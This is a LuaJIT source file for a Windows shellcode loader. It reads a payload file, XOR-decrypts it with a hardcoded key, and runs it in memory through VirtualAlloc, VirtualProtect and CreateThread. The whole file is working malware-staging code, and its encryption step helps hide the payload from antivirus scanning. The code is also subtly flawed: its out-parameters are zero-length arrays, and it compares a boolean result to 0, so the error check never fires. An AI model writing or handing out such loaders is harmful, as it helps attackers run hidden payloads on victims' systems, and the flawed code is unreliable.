local ffi = require("ffi")
local bit = require("bit")

-- Load the shellcode from a binary file
local function load_shellcode(file)
    local f = assert(io.open(file, "rb"))
    local content = f:read("*all")
    f:close()
    return content
end

local shellcode = load_shellcode("sc.bin")
local payload_len = #shellcode

ffi.cdef[[
    typedef unsigned long DWORD;
    typedef void* LPVOID;
    typedef LPVOID HANDLE;
    typedef DWORD (*LPTHREAD_START_ROUTINE)(LPVOID);

    HANDLE CreateThread(
        LPVOID lpThreadAttributes,
        size_t dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        DWORD* lpThreadId
    );

    LPVOID VirtualAlloc(
        LPVOID lpAddress,
        size_t dwSize,
        DWORD    flAllocationType,
        DWORD    flProtect
    );

    bool VirtualProtect(
        LPVOID lpAddress,
        size_t dwSize,
        DWORD  flNewProtect,
        DWORD* lpflOldProtect
    );

    DWORD WaitForSingleObject(
        HANDLE hHandle,
        DWORD  dwMilliseconds
    );
]]

local MEM_COMMIT = 0x00001000
local MEM_RESERVE = 0x00002000
local PAGE_READ_WRITE = 0x04
local PAGE_EXECUTE_READ = 0x20

local kernel32 = ffi.load("kernel32")

local memCmt = bit.bor(MEM_COMMIT, MEM_RESERVE)

-- Allocate memory for the shellcode
local execMem = kernel32.VirtualAlloc(nil, payload_len, memCmt, PAGE_READ_WRITE)
print("Allocated memory at:", execMem)

-- Decrypt the shellcode (XOR with a key)
local key = { 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x65, 0x79 }
local buf = ffi.new("uint8_t[?]", payload_len)

for i = 1, payload_len do
    buf[i - 1] = bit.bxor(string.byte(shellcode, i), key[(i - 1) % #key + 1])
end

-- Copy the decrypted shellcode into the allocated memory
ffi.copy(execMem, buf, payload_len)
print("Copied shellcode to allocated memory")

-- Change memory protection to execute the shellcode
local oldProtect = ffi.new("DWORD[0]")
local success = kernel32.VirtualProtect(execMem, payload_len, PAGE_EXECUTE_READ, oldProtect)

if success == 0 then
    error("Error changing memory protection")
end

-- Cast the memory address to a function and create a new thread to execute it
local threadProc = ffi.cast("LPTHREAD_START_ROUTINE", execMem)
local threadId = ffi.new("DWORD[0]")

print("Executing shellcode in a new thread")

local hThread = kernel32.CreateThread(nil, 0, threadProc, nil, 0, threadId)

if threadId[0] > 0 then
    kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)
end

print("Shellcode execution complete")
